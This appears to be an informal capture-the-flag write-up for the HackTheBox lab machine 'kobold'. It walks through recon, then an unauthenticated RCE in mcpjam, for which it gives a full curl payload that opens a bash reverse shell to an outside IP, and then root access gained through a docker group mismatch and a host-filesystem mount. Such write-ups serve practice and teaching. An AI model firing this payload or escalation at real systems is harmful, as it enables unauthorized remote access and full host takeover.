# kobold

scan:

- 22: ssh
- 80: http
- 443: https
- 3552: arcane docker management http

host: kobold.htb

---

main page has a bunch of stupid shit but nothing to exploit so run a subdomain scan and find

- bin.kobold.htb (privatebin 2.0.2)
- mcp.kobold.htb (mcpjam 1.4.2)

---

looking for vulnerabilities in these apps we can find an [unauthenticated RCE in mcpjam](https://github.com/advisories/GHSA-232v-j27c-5pp6) and [LFI in privatebin](https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82)

---

exploiting the RCE only requires one command:

`curl -L --insecure https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.15.191/4444 0>&1"],"env":{}},"serverId":"pwn"}'`

the trick here and what took me forever to figure out is you need to pass the reverse shell command through `bash -c` otherwise it wont work, due to how the command is evaluated or some shit

---

- user in 'operator' group
- docker installed (we landed on host)

internal services:

- :34155 (some http)
- :6274 (mcpjam)
- :8080 (mcpjam)

- operator can write privatebin data

---

hmm, operator sounds privileged, and since docker is installed we might be able to switch our context and abuse docker

`newgrp docker`

works. welp. there you have it. we didn't need to exploit the privatebin

`docker run --rm -it -u root -v /:/mnt --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2`

---

there is a discrepancy between /etc/group and /etc/gshadow (ben in docker according to gshadow) which allows us to newgrp to docker without having seen it as any of our groups
